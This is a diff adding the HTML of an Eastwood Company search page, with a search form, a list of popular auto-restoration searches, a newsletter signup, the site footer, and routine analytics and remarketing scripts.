+            var blockTag = "turpentine-esi-block-97b6741c64aec859ba447b6f102af79af2dddb30f0c5ecb5ebd7804a0aba790d", esiUrl = "http:\/\/www.eastwood.com\/turpentine\/esi\/getBlock\/method\/ajax\/access\/private\/ttl\/0\/hmac\/6d2bbf581a8c78dff4d5c15202d4a564420f0bd782ec81e12126bcc18217b2ca\/data\/BTwt9311OElpvYbPEBrru37OCHMHFENEqb-r2PpBwkUMGpLWAq-7z8kqh9fdiwWVykTCZJLD7s2sbB7wSvkxBq9bi9sMURJRMthjgbWmNiTYtMIqGw498x35d7MxH51H8Il539m8Mzx_ZqHZhoBB1Z0aR1DO50whLCsfazQWnURuRdgKOUnmJ_YvivfkBpCa4AcCO25p6mL7mtjkla6e1gxgX7O-y2D7DahjcZ1qJ0O1FYsQDdNimRWTW1ZXIV4BHoBY2YNuL2XTZWXB0kEHS7CKvByMSwg6GpAwuAFUY029cgDiC4DZzVfX6B8-IzVKyDvW8Qk82qE=\/";
+            if (typeof Ajax === 'object' && typeof Ajax.Updater === 'function') {
+                new Ajax.Updater(
+                    blockTag,
+                    esiUrl,
+                    {
+                        method: "get",
+                        evalScripts: true,
+                        onSuccess: function() {
+                            $(blockTag).appear({
+                                duration: 0.3
+                            });
+                        }
+                    }
+                );
+            } else if (typeof jQuery === 'function') {
+                jQuery.ajax(
+                    {
+                        url: esiUrl,
+                        type: "get",
+                        dataType: "html"
+                    }
+                ).done(function() {
+                    $(blockTag).fadeIn(300);
+                });
+            }
+        })();
+    </script>
+</div><div class="page-title">
+    <h2>Search</h2>
+</div>
+<!--SLI content begins--><!--/header_code-->
+<table border=0 cellpadding=0 cellspacing=0 width=595>
+
+    <tr valign=top>
+
+    <td><div class="default"> <p align="center"><font size="5" color="#000066"><b><font size="4">Search</font></b></font></p>
+                        <div align="center">
+<br><br>
+
+<div style="position:relative">
+<form method="get" action="http://search.eastwood.com/search" name="searchform">
+
+<input type="hidden" name="p" value="Q" />
+<input type="hidden" name="ts" value="custom" />
+Please enter a search phrase.<br>
+<input type="text" name="w" value="" id="sli_search_2" autocomplete="off" />
+<input type="hidden" name="asug" />
+<input type="submit" value="search" class="submitbutton" />
+<br>
+</form>
+
+<br>
+</div>
+<br>
+<div align="left"><b>Popular Searches:</b><style>
+.sli_alpha_nav,a.sli_alpha_nav,a.sli_alpha_nav:visited,a.sli_alpha_nav:hover{font-size:13pt}
+</style>
+<div class="sli_alpha_nav"><a class="sli_alpha_nav" href="http://search.eastwood.com/popular/0-9">0-9</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/A">A</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/B">B</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/C">C</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/D">D</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/E">E</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/F">F</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/G">G</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/H">H</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/I">I</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/J">J</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/K">K</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/L">L</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/M">M</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/N">N</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/O">O</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/P">P</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/Q">Q</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/R">R</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/S">S</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/T">T</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/U">U</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/V">V</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/W">W</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/X">X</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/Y">Y</a>&nbsp;<a class="sli_alpha_nav" href="http://search.eastwood.com/popular/Z">Z</a></div>
+<ul><li><a href="http://search.eastwood.com/auto/Powder%20Coat">Powder Coat</a></li><li><a href="http://search.eastwood.com/auto/Primer">Primer</a></li><li><a href="http://search.eastwood.com/auto/Epoxy%20Primer">Epoxy Primer</a></li><li><a href="http://search.eastwood.com/auto/Rust%20Encapsulator">Rust Encapsulator</a></li><li><a href="http://search.eastwood.com/auto/Contour%20Sct">Contour Sct</a></li><li><a href="http://search.eastwood.com/auto/Sct">Sct</a></li><li><a href="http://search.eastwood.com/auto/Paint">Paint</a></li><li><a href="http://search.eastwood.com/auto/Plasma%20Cutter">Plasma Cutter</a></li><li><a href="http://search.eastwood.com/auto/Paint%20Guns">Paint Guns</a></li><li><a href="http://search.eastwood.com/auto/Bead%20Roller">Bead Roller</a></li><li><a href="http://search.eastwood.com/auto/Sand%20Blaster">Sand Blaster</a></li><li><a href="http://search.eastwood.com/auto/Welder">Welder</a></li><li><a href="http://search.eastwood.com/auto/Light">Light</a></li><li><a href="http://search.eastwood.com/auto/Rust">Rust</a></li><li><a href="http://search.eastwood.com/auto/Tubing%20Bender">Tubing Bender</a></li><li><a href="http://search.eastwood.com/auto/Air%20Compressor">Air Compressor</a></li><li><a href="http://search.eastwood.com/auto/Blast%20Cabinet">Blast Cabinet</a></li><li><a href="http://search.eastwood.com/auto/Tig%20Welder">Tig Welder</a></li><li><a href="http://search.eastwood.com/auto/Rust%20Converter">Rust Converter</a></li><li><a href="http://search.eastwood.com/auto/Chassis%20Black">Chassis Black</a></li></ul></div>
+
+</div></div></td>
+    </tr>
+
+</table>
+
+
+
+  
+<script language="javascript" type="text/javascript">
+var sliJsHost = (("https:" == document.location.protocol) ? "https://" : "http://");
+document.write(unescape('%3Cscript src="' + sliJsHost + 'search.eastwood.com/rac/sli-rac.config.js" type="text/javascript"%3E%3C/script%3E'));
+</script>
+
+
+	
+	
+	<!-- SLI BEACON BEGIN -->
+<script type="text/javascript">
+    var sliSparkJsHost = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cscript src='" + sliSparkJsHost + "b.sli-spark.com/sli-spark.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script language="javascript" type="text/javascript"> 
+    var spark = new SliSpark("389", "1");
+    spark.setPageType("popular");
+    spark.setSystemUserId("499422224");
+</script>
+<!-- SLI BEACON END -->
+
+<!-- SLI BEACON BEGIN -->
+<script language="javascript" type="text/javascript"> 
+    
+    
+    spark.writeTrackCode();
+</script>
+<!-- SLI BEACON END -->
+
+<script type="text/javascript" src="http://search.eastwood.com//jquery.cookie.js"></script>	
+<!--footer_code--></div>                        </div>
+                        <div class="left-col sidebar">
+
+
+
+
+
+</div></div><div id="footer">
+<div class="footer_inner">
+        <div class="footer_innerleft">        
+            <div class="footer_innleftemailcont">
+                <div class="footer_listheading">
+                    <strong>Email Deals</strong>
+                </div>
+                <p>Sign up now to receive exclusive email deals, industry news, and new product releases.*</p>
+                <form method="post" id="footer-newsletter-validate-detail" action="http://enews.eastwood.com/q/azcHqeQ5x0ZzcdWo0hCVXGA42J07KvmZ7t">
+                    <input type="hidden" name="crvs" value="va880BWFyvnUgv33A48bivlOxlwlsDnxdxSbr0xiRFzaqcqMY-JSZM-UlTBwBDCTzo47XkxdRX09E9f2Ab0COQiwtUTWbDgAMDJrqhFVj5U_edPAsEJxAkht9gEYegE1qS_XlgEDAgCsMNRewaZFKJqZYUax4EvFzx_atC6KOg6VvFnAzFo-NFU8457CsUtA"/>
+                    <input type="text" name="Customer Information.First Name" id="footer-newsletter-name" title="Sign up for our newsletter" class="input-text required-entry" onfocus="this.value=(this.value=='First Name')?'':this.value;" onblur="this.value=!this.value?'First Name':this.value;" value="First Name" />
+                    <input name="email" type="text" id="footer-newsletter-email" onfocus="this.value=(this.value=='Email Address')?'':this.value;" onblur="this.value=!this.value?'Email Address':this.value;" value="Email Address" class="input-text required-entry validate-email" />
+                    <button type="submit" title="Subscribe" class="footer_button" value="Sign Up"></button>
+                </form>
+                <script type="text/javascript">
+                //<![CDATA[
+                    var footerNewsletterSubscriberFormDetail = new VarienForm('footer-newsletter-validate-detail');
+                //]]>
+                </script>
+            </div>
+                 
+
+        <div class="footer_iconcont">
+                <a href="http://www.eastwood.com/bizrate/"><img src="http://www.eastwood.com/skin/frontend/eastwood/eastwood/images/img_02.png" /></a>
+                <a href="http://www.eastwood.com/custserv-whyew/"><img src="http://www.eastwood.com/skin/frontend/eastwood/eastwood/images/img_03.png" /></a>
+        </div>
+
+        <div class="footer_visacont">
+            <p class="title">Buy online or call 1-800-343-9353</p>
+            <img src="http://www.eastwood.com/skin/frontend/eastwood/eastwood/images/visa.png" />
+        </div>
+    </div>
+
+    <div class="footer_innerright">
+        <div class="footer_leftlistcont">
+            <div class="footer_listheading"><strong>About Eastwood</strong></div>
+<div class="footer_listcont">
+    <ul>
+        <li><a href="/why-eastwood">Why Eastwood</a></li>
+ <!-- <li><a href="/contacts">Contact Us</a></li> -->
+        <li><a href="/custserv-contactus">Contact Us</a></li>
+		<li><a href="/employment-opportunities">Employment Opportunities</a></li>
+    </ul>
+</div>
+<div class="footer_listheading" style="padding-top:10px;"><strong>Retail Locations</strong></div>
+<div class="footer_listcont">
+			<ul>
+            <li><a href="/custserv-store"> - Pottstown, PA</a></li>
+			<li><a href="/chicago"> - Chicago, IL</a></li>
+                        <li><a href="/parma"> - Parma, OH</a></li>
+			</ul>
+</div>        </div>
+        <div class="footer_leftlistcont">
+            <div class="footer_listheading"><strong>Customer Service</strong></div>
+<div class="footer_listcont">
+    <ul>
+        <li><a href="/customer/account/">My Account</a></li>
+        <li><a href="/customer-service">Customer Service</a></li>
+        <li><a href="/lifetime-guarantee">Our Guarantee</a></li>
+        <li><a href="/custserv-faq">FAQs</a></li>
+        <li><a href="/catalog/request">Request a Catalog</a></li>
+        <li><a href="/distributor_intl">International Customers</a></li>
+    </ul>
+<a href="http://www.eastwood.com/images/recall_poster_r2_combined.pdf" target="blank"><img src="http://www.eastwood.com/images/button_recall_information.png"></a>
+</div>        </div>
+        <div class="footer_leftlistcont">
+            <div class="footer_listheading"><strong>How To Info</strong></div>
+<div class="footer_listcont">
+    <ul>
+        <li><a href="http://forum.eastwood.com/"target="_blank">Online Restoration Forum</a></li>
+        <li><a href="/tech-library">How To Center</a></li>
+        <li><a href="http://www.eastwood.com/blog">Eastwood Blog</a></li>
+        <li><a href="/catalog-specialty-coatings">Videos</a></li>
+        <li><a href="/Eastwood_Tech_FAQs">Top 20 Tech Questions</a></li>
+        <li><b>Free Tech Advice 866-759-2131</b></li>
+    </ul>
+</div>        </div>
+        <div class="footer_leftlistcont footer_leftlistcontsec">
+            <div class="footer_listheading"><strong>Connect With Us</strong></div>
+<div class="footer_listcont">
+    <table width="0%" border="0" cellspacing="0" cellpadding="0" style="margin-top:0px">
+        <tbody>
+        <tr>
+            <td width="0%" style="padding-left:15px; padding-top:5px; padding-bottom:0px; padding-right:0px"><a
+                    href="http://www.facebook.com/eastwoodcompany" target="_blank"><img name=""
+                                                                        src="/images/email_images/social_content/facebook.png"
+                                                                        width="50" height="50" alt=""></a></td>
+            <td width="0%" style="padding-right:0px; padding-top:5px; padding-bottom:0px; padding-left:0px"><a
+                    href="http://twitter.com/eastwoodco" target="_blank"><img name=""
+                                                              src="/images/email_images/social_content/twitter.png"
+                                                              width="50" height="50" alt=""></a></td>
+        </tr>
+        <tr>
+            <td width="0%" style="padding-left:15px; padding-top:0px; padding-bottom:0px; padding-right:0px"><a
+                    href="http://www.youtube.com/user/EastwoodCo" target="_blank"><img name=""
+                                                                       src="/images/email_images/social_content/youtube.png"
+                                                                       width="50" height="50" alt=""></a></td>
+            <td width="0%" style="padding-right:0px; padding-top:0px; padding-bottom:0px; padding-left:0px"><a
+                    href="http://www.eastwood.com/blog"><img name=""
+                                                          src="/images/email_images/social_content/wordpress.png"
+                                                          width="50" height="50" alt=""></a></td>
+        </tr>
+        <tr>
+            <td width="0%" style="padding-left:15px; padding-top:0px; padding-bottom:0px; padding-right:0px"><a
+                    href="https://plus.google.com/+eastwood/about?prsrc=3" target="_blank"><img
+                        name="" src="/images/email_images/social_content/googleplus.png"
+                        width="50" height="50" alt=""></a></td>
+            <td width="0%" style="padding-right:0px; padding-top:0px; padding-bottom:0px; padding-left:0px"><a
+                    href="http://pinterest.com/source/eastwood.com/" target="_blank"><img name=""
+                                                                          src="/images/email_images/social_content/pinterest2.png"
+                                                                          width="50" height="50" alt=""></a></td>
+        </tr>
+        <tr>
+            <td colspan="2" style="padding-left:40px; padding-top:4px; padding-bottom:5px; padding-right:0px"><a
+                    href="http://instagram.com/eastwoodco" target="_blank"><img
+                        src="/images/email_images/social_content/300px-Instagram_logo.png"
+                        alt="Connect with us at hubgarage.com" width="42" height="42" border="0"></a></td>
+        </tr>
+        </tbody>
+    </table>
+<a href="/car-show-request" target="blank"><img src="http://www.eastwood.com/images/button_Car_Show.png"></a>
+</div>        </div>
+    </div>
+    <div class="footer_copyrightcont">
+            <p>&copy;2016&nbsp;The Eastwood Company. All rights reserved. *Your privacy is important to us- Eastwood does not sell, rent or share your email information</p>
+                                    <div style="font-size: 15px; font-weight: bold; padding-top: 8px;">Source Code: 1NT01</div>
+    </div>
+</div>
+</div>
+ 
+<!-- ESI END DUMMY COMMENT [] -->
+            </div>
+        </div>
+        <script type="text/javascript">
+ document.write(unescape("%3Cscript src='" + cvtJsHost + cvtSiteName + "/extras.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<!-- Google Code for Visitors to all but Home Page -->
+<script type="text/javascript">
+/* <![CDATA[ */
+var google_conversion_id = 1072556849;
+var google_conversion_label = "YbAnCJT5wgQQsda3_wM";
+var google_custom_params = window.google_tag_params;
+var google_remarketing_only = true;
+/* ]]> */
+</script>
+<script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
+</script>
+<noscript>
+<div style="display:inline;">
+<img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/1072556849/?value=0&amp;label=YbAnCJT5wgQQsda3_wM&amp;guid=ON&amp;script=0"/>
+</div>
+</noscript><script type="text/javascript">
+    var google_tag_params = {
+        prodid: "",        // Must match your Google Merchant Center ID.  See sample file
+        pagetype: "",    // See guide for values
+        value: ""           // (optional) can be used to segment lists, optimize bids
+    };
+</script>
+<script type="text/javascript">
+/* <![CDATA[ */
+    var google_conversion_id = 1072556849;
+    var google_conversion_label = "vRAMCKyS3gMQsda3_wM";
+    var google_custom_params = window.google_tag_params;
+    var google_remarketing_only = true;
+/* ]]> */
+</script>
+<script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js"></script>
+<noscript>
+    <div style="display:inline;">
+        <img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/1072556849/?value=0&amp;label=vRAMCKyS3gMQsda3_wM&amp;guid=ON&amp;script=0"/>
+    </div>
+</noscript><script type="text/javascript">
+arrEcjs = [];
+function _ecjs(ecid,email) { new Ajax.Request("http://www.eastwood.com/remarketing/email/", {parameters:{cid: ecid, email: email}}); }
+function ecjsInit() {for(var ecjsi = 0; ecjsi < arrEcjs.length; ecjsi++) {if($(arrEcjs[ecjsi].id)) {$(arrEcjs[ecjsi].id).stopObserving("change", arrEcjs[ecjsi].fn);$(arrEcjs[ecjsi].id).observe("change", arrEcjs[ecjsi].fn);}}}
+arrEcjs.push({id:"ltkmodal-email", fn: function() { _ecjs(2, $(this).value);}});
+arrEcjs.push({id:"newsletter", fn: function() { _ecjs(4, $(this).value);}});
+document.observe("dom:loaded", function() { ecjsInit(); 
+Ajax.Responders.register({onComplete: function() {ecjsInit();}});});
+</script><script src="http://www.eastwood.com/js/mirasvit/code/feedexport/performance.js" type="text/javascript"></script>    </div>
+</div>
+<!--<div id="google_translate_element"></div><script>
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({
+    pageLanguage: 'en',
+    includedLanguages: 'es'
+  }, 'google_translate_element');
+}
+</script><script src="http://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>--><!-- MODAL POPUP SCRIPTS -->
+	<script language="javascript" type="text/javascript"  src="http://assets.resultspage.com/js/jquery.timers-1.1.2.min.js"></script>
+	<script language="javascript" type="text/javascript"  src="http://assets.resultspage.com/js/modal-1.min.js"></script>
+	
+</body>
+</html><!--/footer_code-->
